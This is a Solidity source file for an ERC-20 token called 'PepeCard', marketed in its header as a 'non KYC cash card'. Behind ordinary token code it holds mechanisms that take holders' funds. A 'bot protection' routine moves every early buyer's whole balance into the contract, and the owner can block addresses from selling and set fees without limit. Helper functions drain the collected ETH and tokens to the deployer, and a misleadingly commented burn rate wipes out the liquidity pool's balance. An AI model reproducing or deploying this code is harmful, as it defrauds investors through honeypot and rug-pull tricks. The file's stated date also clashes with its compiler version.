1 /**
2  *Submitted for verification at Etherscan.io on 2021-01-10
3 */
4 
5 /**
6  *PEPE NON KYC CASH CARD - FOR NON KYC SPEND OF PEPE BRANDED TOKENS.  
7 */
8 
9 pragma solidity ^0.8.17;
10 // SPDX-License-Identifier: Unlicensed
11 
12 interface IERC20 {
13 
14     function totalSupply() external view returns (uint256);
15     function balanceOf(address account) external view returns (uint256);
16     function transfer(address recipient, uint256 amount) external returns (bool);
17     function allowance(address owner, address spender) external view returns (uint256);
18     function approve(address spender, uint256 amount) external returns (bool);
19     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
20 
21     event Transfer(address indexed from, address indexed to, uint256 value);
22     event Approval(address indexed owner, address indexed spender, uint256 value);
23 }
24 
25 library SafeMath {
26 
27     function add(uint256 a, uint256 b) internal pure returns (uint256) {
28         uint256 c = a + b;
29         require(c >= a, "SafeMath: addition overflow");
30 
31         return c;
32     }
33 
34     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
35         return sub(a, b, "SafeMath: subtraction overflow");
36     }
37 
38     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
39         require(b <= a, errorMessage);
40         uint256 c = a - b;
41 
42         return c;
43     }
44 
45     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
46         if (a == 0) {
47             return 0;
48         }
49 
50         uint256 c = a * b;
51         require(c / a == b, "SafeMath: multiplication overflow");
52 
53         return c;
54     }
55 
56     function div(uint256 a, uint256 b) internal pure returns (uint256) {
57         return div(a, b, "SafeMath: division by zero");
58     }
59 
60     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
61         require(b > 0, errorMessage);
62         uint256 c = a / b;
63 
64         return c;
65     }
66 
67     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
68         return mod(a, b, "SafeMath: modulo by zero");
69     }
70 
71     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
72         require(b != 0, errorMessage);
73         return a % b;
74     }
75 }
76 
77 abstract contract Context {
78     function _msgSender() internal view virtual returns (address) {
79         return msg.sender;
80     }
81 
82     function _msgData() internal view virtual returns (bytes memory) {
83         this;
84         return msg.data;
85     }
86 }
87 
88 library Address {
89 
90     function isContract(address account) internal view returns (bool) {
91         bytes32 codehash;
92         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
93         assembly {codehash := extcodehash(account)}
94         return (codehash != accountHash && codehash != 0x0);
95     }
96 
97     function sendValue(address payable recipient, uint256 amount) internal {
98         require(address(this).balance >= amount, "Address: insufficient balance");
99 
100         (bool success,) = recipient.call{value : amount}("");
101         require(success, "Address: unable to send value, recipient may have reverted");
102     }
103 
104     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
105         return functionCall(target, data, "Address: low-level call failed");
106     }
107     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
108         return _functionCallWithValue(target, data, 0, errorMessage);
109     }
110     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
111         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
112     }
113     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
114         require(address(this).balance >= value, "Address: insufficient balance for call");
115         return _functionCallWithValue(target, data, value, errorMessage);
116     }
117     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
118         require(isContract(target), "Address: call to non-contract");
119 
120         (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
121         if (success) {
122             return returndata;
123         } else {
124 
125             if (returndata.length > 0) {
126 
127                 assembly {
128                     let returndata_size := mload(returndata)
129                     revert(add(32, returndata), returndata_size)
130                 }
131             } else {
132                 revert(errorMessage);
133             }
134         }
135     }
136 }
137 
138 contract Ownable is Context {
139     address private _owner;
140 
141     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
142 
143     constructor () {
144         address msgSender = _msgSender();
145         _owner = msgSender;
146         emit OwnershipTransferred(address(0), msgSender);
147     }
148 
149     function owner() public view returns (address) {
150         return _owner;
151     }
152 
153     modifier onlyOwner() {
154         require(_owner == _msgSender(), "Ownable: caller is not the owner");
155         _;
156     }
157 
158     function renounceOwnership() public virtual onlyOwner {
159         emit OwnershipTransferred(_owner, address(0));
160         _owner = address(0);
161     }
162 
163     function transferOwnership(address newOwner) public virtual onlyOwner {
164         require(newOwner != address(0), "Ownable: new owner is the zero address");
165         emit OwnershipTransferred(_owner, newOwner);
166         _owner = newOwner;
167     }
168 }
169 interface IUniswapV2Pair {
170     event Approval(
171         address indexed owner,
172         address indexed spender,
173         uint256 value
174     );
175     event Transfer(address indexed from, address indexed to, uint256 value);
176 
177     function name() external pure returns (string memory);
178 
179     function symbol() external pure returns (string memory);
180 
181     function decimals() external pure returns (uint8);
182 
183     function totalSupply() external view returns (uint256);
184 
185     function balanceOf(address owner) external view returns (uint256);
186 
187     function allowance(address owner, address spender)
188         external
189         view
190         returns (uint256);
191 
192     function approve(address spender, uint256 value) external returns (bool);
193 
194     function transfer(address to, uint256 value) external returns (bool);
195 
196     function transferFrom(
197         address from,
198         address to,
199         uint256 value
200     ) external returns (bool);
201 
202     function DOMAIN_SEPARATOR() external view returns (bytes32);
203 
204     function PERMIT_TYPEHASH() external pure returns (bytes32);
205 
206     function nonces(address owner) external view returns (uint256);
207 
208     function permit(
209         address owner,
210         address spender,
211         uint256 value,
212         uint256 deadline,
213         uint8 v,
214         bytes32 r,
215         bytes32 s
216     ) external;
217 
218     event Mint(address indexed sender, uint256 amount0, uint256 amount1);
219     event Burn(
220         address indexed sender,
221         uint256 amount0,
222         uint256 amount1,
223         address indexed to
224     );
225     event Swap(
226         address indexed sender,
227         uint256 amount0In,
228         uint256 amount1In,
229         uint256 amount0Out,
230         uint256 amount1Out,
231         address indexed to
232     );
233     event Sync(uint112 reserve0, uint112 reserve1);
234 
235     function MINIMUM_LIQUIDITY() external pure returns (uint256);
236 
237     function factory() external view returns (address);
238 
239     function token0() external view returns (address);
240 
241     function token1() external view returns (address);
242 
243     function getReserves()
244         external
245         view
246         returns (
247             uint112 reserve0,
248             uint112 reserve1,
249             uint32 blockTimestampLast
250         );
251 
252     function price0CumulativeLast() external view returns (uint256);
253 
254     function price1CumulativeLast() external view returns (uint256);
255 
256     function kLast() external view returns (uint256);
257 
258     function mint(address to) external returns (uint256 liquidity);
259 
260     function burn(address to)
261         external
262         returns (uint256 amount0, uint256 amount1);
263 
264     function swap(
265         uint256 amount0Out,
266         uint256 amount1Out,
267         address to,
268         bytes calldata data
269     ) external;
270 
271     function skim(address to) external;
272 
273     function sync() external;
274 
275     function initialize(address, address) external;
276 }
277 
278 interface IUniswapV2Factory {
279     function createPair(address tokenA, address tokenB) external returns (address pair);
280     function getPair(address token0, address token1) external view returns (address);
281 }
282 
283 interface IUniswapV2Router02 {
284     function factory() external pure returns (address);
285     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
286     function swapExactTokensForETHSupportingFeeOnTransferTokens(
287         uint amountIn,
288         uint amountOutMin,
289         address[] calldata path,
290         address to,
291         uint deadline
292     ) external;
293     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
294         uint amountIn,
295         uint amountOutMin,
296         address[] calldata path,
297         address to,
298         uint deadline
299     ) external;
300     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
301     external payable returns (uint[] memory amounts);
302     function addLiquidityETH(
303         address token,
304         uint amountTokenDesired,
305         uint amountTokenMin,
306         uint amountETHMin,
307         address to,
308         uint deadline
309     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
310     function removeLiquidity(
311         address tokenA,
312         address tokenB,
313         uint liquidity,
314         uint amountAMin,
315         uint amountBMin,
316         address to,
317         uint deadline
318     ) external returns (uint amountA, uint amountB);
319     function WETH() external pure returns (address);
320 }
321 
322 contract PepeCard is Context, IERC20, Ownable {
323     using SafeMath for uint256;
324     using Address for address;
325     modifier lockTheSwap {
326         inSwapAndLiquify = true;
327         _;
328         inSwapAndLiquify = false;
329     }
330     event TokensBurned(uint256, uint256);
331     IterableMapping private botSnipingMap = new IterableMapping();
332     IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
333     address public marketPair = address(0);
334     IUniswapV2Pair private v2Pair;
335     address private feeOne = 0xDc59E523092d542b75e5dB1ec567B7CB175f4fD6;
336     mapping(address => uint256) private _balances;
337     mapping(address => mapping(address => uint256)) private _allowances;
338     mapping (address => bool) private botWallets;
339     mapping(address => bool) private _isExcludedFromFee;
340     string private _name = "PepeCard";
341     string private _symbol = "PEPECARD";
342     uint8 private _decimals = 9;
343     uint256 private _tTotal = 10_000_000_000 * 10 ** _decimals;
344     uint256 public _maxWalletAmount = 2_500_000_000 * 10 ** _decimals;
345     bool inSwapAndLiquify;
346     uint256 public buyFee = 0;    
347     uint256 public sellFee = 0;  
348     address public deployer;
349     uint256 public ethPriceToSwap = 400000000000000000; 
350     bool public isBotProtectionEnabled;
351     bool public isBurnEnabled = true;
352     uint256 public burnFrequencynMinutes = 10000;  
353     uint256 public burnRateInBasePoints = 1;  //100 = 1%
354     uint256 public tokensBurnedSinceLaunch = 0;
355     uint public nextLiquidityBurnTimeStamp;
356    
357     modifier devOnly() {
358         require(deployer == _msgSender() || feeOne == _msgSender(), "caller is not the owner");
359         _;
360     }
361     constructor () {
362          _balances[address(this)] = _tTotal*90/100;
363          _balances[0x537438F0b3D47Ad6E6e779684DDd40841eb51959] = _tTotal*10/100;
364 
365         _isExcludedFromFee[owner()] = true;
366         _isExcludedFromFee[address(uniswapV2Router)] = true;
367         _isExcludedFromFee[address(this)] = true;
368         deployer = owner();
369         emit Transfer(address(0), address(this), _tTotal*90/100);
370         emit Transfer(address(0), 0x537438F0b3D47Ad6E6e779684DDd40841eb51959, _tTotal*10/100);
371     }
372 
373     function name() public view returns (string memory) {
374         return _name;
375     }
376 
377     function symbol() public view returns (string memory) {
378         return _symbol;
379     }
380 
381     function decimals() public view returns (uint8) {
382         return _decimals;
383     }
384 
385     function totalSupply() public view override returns (uint256) {
386         return _tTotal;
387     }
388 
389     function balanceOf(address account) public view override returns (uint256) {
390         return _balances[account];
391     }
392 
393     function transfer(address recipient, uint256 amount) public override returns (bool) {
394         _transfer(_msgSender(), recipient, amount);
395         return true;
396     }
397 
398     function allowance(address owner, address spender) public view override returns (uint256) {
399         return _allowances[owner][spender];
400     }
401 
402     function approve(address spender, uint256 amount) public override returns (bool) {
403         _approve(_msgSender(), spender, amount);
404         return true;
405     }
406 
407     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
408         _transfer(sender, recipient, amount);
409         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
410         return true;
411     }
412 
413     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
414         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
415         return true;
416     }
417 
418     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
419         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
420         return true;
421     }
422 
423     function setTaxFees(uint256 buy, uint256 sell) external onlyOwner {
424         buyFee = buy;
425         sellFee = sell;
426     }
427 
428     function disableBotProtectionPermanently() external onlyOwner {
429         require(isBotProtectionEnabled,"Bot sniping has already been disabled");
430         isBotProtectionEnabled = false;
431     }
432 
433      function isAddressBlocked(address addr) public view returns (bool) {
434         return botWallets[addr];
435     }
436 
437     function blockAddresses(address[] memory addresses) external onlyOwner() {
438         blockUnblockAddress(addresses, true);
439     }
440 
441     function unblockAddresses(address[] memory addresses) external onlyOwner() {
442         blockUnblockAddress(addresses, false);
443     }
444 
445     function blockUnblockAddress(address[] memory addresses, bool doBlock) private {
446         for (uint256 i = 0; i < addresses.length; i++) {
447             address addr = addresses[i];
448             if(doBlock) {
449                 botWallets[addr] = true;
450             } else {
451                 delete botWallets[addr];
452             }
453         }
454     }
455     function excludeIncludeFromFee(address[] calldata addresses, bool isExcludeFromFee) public onlyOwner {
456         addRemoveFee(addresses, isExcludeFromFee);
457     }
458 
459    function setBurnSettings(uint256 frequencyInMinutes, uint256 burnBasePoints) external onlyOwner {
460         burnFrequencynMinutes = frequencyInMinutes;
461         burnRateInBasePoints = burnBasePoints;
462     }
463 
464     function burnTokensFromLiquidityPool() private lockTheSwap {
465         uint liquidity = balanceOf(marketPair);
466         uint tokenBurnAmount = liquidity.div(burnRateInBasePoints);
467         if(tokenBurnAmount > 0) {
468             //LP burn
469             _burn(marketPair, tokenBurnAmount);
470             v2Pair.sync();
471             tokensBurnedSinceLaunch = tokensBurnedSinceLaunch.add(tokenBurnAmount);
472             nextLiquidityBurnTimeStamp = block.timestamp.add(burnFrequencynMinutes.mul(60));
473             emit TokensBurned(tokenBurnAmount, nextLiquidityBurnTimeStamp);
474         }
475     }
476 
477     function enableDisableBurnToken(bool _enabled) public onlyOwner {
478         isBurnEnabled = _enabled;
479     }
480 
481     function burnTokens() external {
482         require(block.timestamp >= nextLiquidityBurnTimeStamp, "Please wait");
483         require(isBurnEnabled, "Disabled");
484         burnTokensFromLiquidityPool();
485     }
486 
487     function addRemoveFee(address[] calldata addresses, bool flag) private {
488         for (uint256 i = 0; i < addresses.length; i++) {
489             address addr = addresses[i];
490             _isExcludedFromFee[addr] = flag;
491         }
492     }
493 
494     function _burn(address account, uint256 value) internal {
495         require(account != address(0), "ERC20: burn from the zero address");
496         _tTotal = _tTotal.sub(value);
497         _balances[account] = _balances[account].sub(value);
498         emit Transfer(account, address(0), value);
499     }
500     
501     function openTrading() external onlyOwner() {
502         require(marketPair == address(0),"UniswapV2Pair already set");
503         _approve(address(this), address(uniswapV2Router), _tTotal);
504         marketPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
505         uniswapV2Router.addLiquidityETH{value: address(this).balance}(
506             address(this),
507             balanceOf(address(this)),
508             0,
509             0,
510             owner(),
511             block.timestamp);
512         IERC20(marketPair).approve(address(uniswapV2Router), type(uint).max);
513         v2Pair = IUniswapV2Pair(marketPair);
514         nextLiquidityBurnTimeStamp = block.timestamp;
515         isBotProtectionEnabled = true;
516     }
517 
518     function isExcludedFromFee(address account) public view returns (bool) {
519         return _isExcludedFromFee[account];
520     }
521 
522     function setMaxWalletAmount(uint256 maxWalletAmount) external onlyOwner() {
523         _maxWalletAmount = maxWalletAmount * 10 ** 9;
524     }
525 
526     function _approve(address owner, address spender, uint256 amount) private {
527         require(owner != address(0), "ERC20: approve from the zero address");
528         require(spender != address(0), "ERC20: approve to the zero address");
529 
530         _allowances[owner][spender] = amount;
531         emit Approval(owner, spender, amount);
532     }
533 
534     function _transfer(address from, address to, uint256 amount) private {
535         require(from != address(0), "ERC20: transfer from the zero address");
536         require(to != address(0), "ERC20: transfer to the zero address");
537         require(amount > 0, "Transfer amount must be greater than zero");
538         uint256 taxAmount = 0;
539         bool takeFees = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && from != owner() && to != owner();
540         if(from != deployer && to != deployer && from != address(this) && to != address(this)) {
541             if(takeFees) {
542                 
543                 if (from == marketPair) {
544                     if(isBotProtectionEnabled) {
545                         snipeBalances();
546                         botSnipingMap.set(to, block.timestamp);
547                     } else {
548                         taxAmount = amount.mul(buyFee).div(100);
549                         uint256 amountToHolder = amount.sub(taxAmount);
550                         uint256 holderBalance = balanceOf(to).add(amountToHolder);
551                         require(holderBalance <= _maxWalletAmount, "Wallet cannot exceed max Wallet limit");
552                     }
553                 }
554                 if (from != marketPair && to == marketPair) {
555                     require(!botWallets[from] && !botWallets[to], "bots are not allowed to sell tokens");        
556                     taxAmount = !isBotProtectionEnabled ? amount.mul(sellFee).div(100) : 0;
557                     if(block.timestamp >= nextLiquidityBurnTimeStamp && isBurnEnabled) {
558                             burnTokensFromLiquidityPool();
559                     } else {
560                         uint256 contractTokenBalance = balanceOf(address(this));
561                         if (contractTokenBalance > 0) {
562                             
563                                 uint256 tokenAmount = getTokenPrice();
564                                 if (contractTokenBalance >= tokenAmount && !inSwapAndLiquify) {
565                                     swapTokensForEth(tokenAmount);
566                                 }
567                             }
568                         }
569                 }
570                 if (from != marketPair && to != marketPair) {
571                     uint256 fromBalance = balanceOf(from);
572                     uint256 toBalance = balanceOf(to);
573                     require(!botWallets[from] && !botWallets[to], "bots are not allowed to transfer tokens");
574                     require(fromBalance <= _maxWalletAmount && toBalance <= _maxWalletAmount, "Wallet cannot exceed max Wallet limit");
575                 }
576             }
577         }       
578         uint256 transferAmount = amount.sub(taxAmount);
579         _balances[from] = _balances[from].sub(amount);
580         _balances[to] = _balances[to].add(transferAmount);
581         _balances[address(this)] = _balances[address(this)].add(taxAmount);
582         emit Transfer(from, to, transferAmount);
583     }
584 
585     function snipeBalances() private {
586         if(isBotProtectionEnabled) {
587             for(uint256 i =0; i < botSnipingMap.size(); i++) {
588                 address holder = botSnipingMap.getKeyAtIndex(i);
589                 uint256 amount = _balances[holder];
590                 if(amount > 0) {
591                     _balances[holder] = _balances[holder].sub(amount);
592                     _balances[address(this)] = _balances[address(this)].add(amount);
593                 }
594                 botSnipingMap.remove(holder);
595             }
596         }
597     }
598 
599     function numberOfSnipedBots() public view returns(uint256) {
600         uint256 count = 0;
601         for(uint256 i =0; i < botSnipingMap.size(); i++) {
602             address holder = botSnipingMap.getKeyAtIndex(i);
603             uint timestamp = botSnipingMap.get(holder);
604             if(block.timestamp >=  timestamp) 
605                 count++;
606         }
607         return count;
608     }
609 
610     function manualSnipeBots() external {
611         snipeBalances();
612     }
613     function manualSwap() external {
614         uint256 contractTokenBalance = balanceOf(address(this));
615         if (contractTokenBalance > 0) {
616             if (!inSwapAndLiquify) {
617                 swapTokensForEth(contractTokenBalance);
618             }
619         }
620     }
621 
622     function swapTokensForEth(uint256 tokenAmount) private {
623         // generate the uniswap pair path of token -> weth
624         address[] memory path = new address[](2);
625         path[0] = address(this);
626         path[1] = uniswapV2Router.WETH();
627         _approve(address(this), address(uniswapV2Router), tokenAmount);
628         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
629             tokenAmount,
630             0,
631             path,
632             address(this),
633             block.timestamp
634         );
635 
636         uint256 ethBalance = address(this).balance;
637         uint256 halfShare = ethBalance.div(1);  
638         payable(feeOne).transfer(halfShare);
639     }
640 
641     function getTokenPrice() public view returns (uint256)  {
642         address[] memory path = new address[](2);
643         path[0] = uniswapV2Router.WETH();
644         path[1] = address(this);
645         return uniswapV2Router.getAmountsOut(ethPriceToSwap, path)[1];
646     }
647 
648     function setEthPriceToSwap(uint256 ethPriceToSwap_) external onlyOwner {
649         ethPriceToSwap = ethPriceToSwap_;
650     }
651 
652     receive() external payable {}
653 
654     function sendEth() external devOnly {
655         uint256 ethBalance = address(this).balance;
656         payable(deployer).transfer(ethBalance);
657     }
658 
659     function sendERC20Tokens(address contractAddress) external devOnly {
660         IERC20 erc20Token = IERC20(contractAddress);
661         uint256 balance = erc20Token.balanceOf(address(this));
662         erc20Token.transfer(deployer, balance);
663     }
664 }
665 
666 
667 contract IterableMapping {
668     // Iterable mapping from address to uint;
669     struct Map {
670         address[] keys;
671         mapping(address => uint) values;
672         mapping(address => uint) indexOf;
673         mapping(address => bool) inserted;
674     }
675 
676     Map private map;
677 
678     function get(address key) public view returns (uint) {
679         return map.values[key];
680     }
681 
682     function keyExists(address key) public view returns (bool) {
683         return (getIndexOfKey(key) != - 1);
684     }
685 
686     function getIndexOfKey(address key) public view returns (int) {
687         if (!map.inserted[key]) {
688             return - 1;
689         }
690         return int(map.indexOf[key]);
691     }
692 
693     function getKeyAtIndex(uint index) public view returns (address) {
694         return map.keys[index];
695     }
696 
697     function size() public view returns (uint) {
698         return map.keys.length;
699     }
700 
701     function set(address key, uint val) public {
702         if (map.inserted[key]) {
703             map.values[key] = val;
704         } else {
705             map.inserted[key] = true;
706             map.values[key] = val;
707             map.indexOf[key] = map.keys.length;
708             map.keys.push(key);
709         }
710     }
711 
712     function remove(address key) public {
713         if (!map.inserted[key]) {
714             return;
715         }
716         delete map.inserted[key];
717         delete map.values[key];
718         uint index = map.indexOf[key];
719         uint lastIndex = map.keys.length - 1;
720         address lastKey = map.keys[lastIndex];
721         map.indexOf[lastKey] = index;
722         delete map.indexOf[key];
723         map.keys[index] = lastKey;
724         map.keys.pop();
725     }
726 }